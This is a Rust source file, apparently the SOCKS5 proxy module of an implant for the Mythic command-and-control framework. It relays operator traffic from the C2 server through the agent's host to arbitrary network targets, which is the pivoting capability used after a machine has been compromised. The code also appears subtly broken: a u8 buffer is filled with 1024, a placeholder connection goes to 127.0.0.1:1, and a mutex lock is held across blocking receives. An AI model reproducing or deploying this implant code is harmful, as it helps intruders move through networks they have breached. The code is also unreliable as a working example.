// Gerar test
use crate::agent::AgentTask;
use crate::mythic_continued;
use base64::{decode, encode};
use serde::Deserialize;
use serde_json::json;
use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, SocketAddr};
use std::sync::{mpsc, Arc, Mutex};
use std::thread;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::runtime::Runtime;

#[derive(Deserialize)]
struct SocksTask {
    port: u16,
}

/// Handle a single SOCKS proxy connection.
/// This includes performing the SOCKS5 handshake, connecting to the remote target,
/// and setting up bidirectional forwarding between the remote target and Mythic.
async fn handle_connection(
    server_id: String,
    mut stream: TcpStream,
    tx: mpsc::Sender<serde_json::Value>,
    rx: Arc<Mutex<mpsc::Receiver<serde_json::Value>>>,
) -> Result<(), Box<dyn Error>> {
    let mut buf = vec![0u8; 1024];

    // === Step 1: Receive SOCKS5 request from Mythic (via socks_in proxy packet) ===
    let req_msg = rx.lock().unwrap().recv()?;
    let decoded = decode(req_msg["data"].as_str().unwrap_or(""))?;
    if decoded.len() < 10 {
        return Err("SOCKS5 request too short".into());
    }

    // === Step 2: Parse the destination address and port ===
    let atyp = decoded[3];
    let (addr, port) = match atyp {
        0x01 => {
            // IPv4 address
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            (ip.to_string(), port)
        }
        0x03 => {
            // Domain name
            let len = decoded[4] as usize;
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([
                decoded[5 + len],
                decoded[6 + len],
            ]);
            (domain, port)
        }
        _ => return Err("Unsupported address type in SOCKS5 request".into()),
    };

    // === Step 3: Attempt to connect to the remote target ===
    let mut remote = match TcpStream::connect(format!("{}:{}", addr, port)).await {
        Ok(s) => s,
        Err(_) => {
            let fail_reply = build_reply(0x01); // general failure
            send_data(&tx, &server_id, &fail_reply, true)?;
            return Ok(());
        }
    };

    // === Step 4: Send successful SOCKS5 response to Mythic ===
    let success_reply = build_reply(0x00);
    send_data(&tx, &server_id, &success_reply, false)?;

    // === Step 5: Start forwarding data between remote and Mythic ===
    let tx_clone = tx.clone();
    let rx_clone = Arc::clone(&rx);
    let server_id_clone = server_id.clone();

    // Task: remote → Mythic (a2m)
    let a2m = tokio::spawn(async move {
        let mut buf = vec![1024u8; 1024];
        loop {
            match remote.read(&mut buf).await {
                Ok(0) => {
                    let _ = send_data(&tx_clone, &server_id_clone, b"", true);
                    break;
                }
                Ok(n) => {
                    let _ = send_data(&tx_clone, &server_id_clone, &buf[..n], false);
                }
                Err(_) => {
                    let _ = send_data(&tx_clone, &server_id_clone, b"", true);
                    break;
                }
            }
        }
    });

    // Task: Mythic → remote (m2a)
    let m2a = tokio::spawn(async move {
        loop {
            let msg = match rx_clone.lock().unwrap().recv() {
                Ok(m) => m,
                Err(_) => break,
            };

            if msg["server_id"] != server_id {
                continue;
            }

            if msg["exit"].as_bool().unwrap_or(false) {
                let _ = remote.shutdown().await;
                break;
            }

            if let Ok(data) = decode(msg["data"].as_str().unwrap_or("")) {
                let _ = remote.write_all(&data).await;
            }
        }
    });

    let _ = a2m.await;
    let _ = m2a.await;
    Ok(())
}

/// Build a SOCKS5 response packet.
/// REP = status (0x00 = success, 0x01 = failure, etc.)
fn build_reply(rep: u8) -> Vec<u8> {
    vec![
        0x05, rep, 0x00, 0x01, // Version, status, reserved, ATYP (IPv4)
        0, 0, 0, 0, // BND.ADDR
        0, 0        // BND.PORT
    ]
}

/// Send a data packet to Mythic via socks_out channel.
/// Automatically base64 encodes the payload.
fn send_data(
    tx: &mpsc::Sender<serde_json::Value>,
    server_id: &str,
    data: &[u8],
    exit: bool,
) -> Result<(), Box<dyn Error>> {
    let packet = json!({
        "server_id": server_id,
        "data": encode(data),
        "exit": exit,
    });
    tx.send(packet)?;
    Ok(())
}

/// Main entry point for the `socks` background task.
/// Waits for new SOCKS5 connections from Mythic and spawns handlers for each.
pub fn handle_socks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;

    // Notify Mythic that SOCKS is active
    tx.send(mythic_continued!(
        task.id,
        "SOCKS handler active",
        "Awaiting SOCKS proxy data from Mythic"
    ))?;

    // Shared reference for all threads
    let rx = Arc::new(Mutex::new(rx));

    // Start the async runtime
    let rt = Runtime::new()?;
    rt.block_on(async {
        loop {
            // Block until a new SOCKS connection packet is received from Mythic
            let msg = match rx.lock().unwrap().recv() {
                Ok(m) => m,
                Err(_) => break,
            };

            if msg.get("server_id").is_none() {
                continue;
            }

            let server_id = msg["server_id"].as_str().unwrap_or("").to_string();

            // Create a dummy local TCP stream (can be optimized out if not needed)
            let socket = TcpStream::connect("127.0.0.1:1").await?;

            // Spawn handler for each incoming proxy session
            let handler = handle_connection(server_id.clone(), socket, tx.clone(), Arc::clone(&rx));
            tokio::spawn(handler);
        }
    });

    Ok(())
}
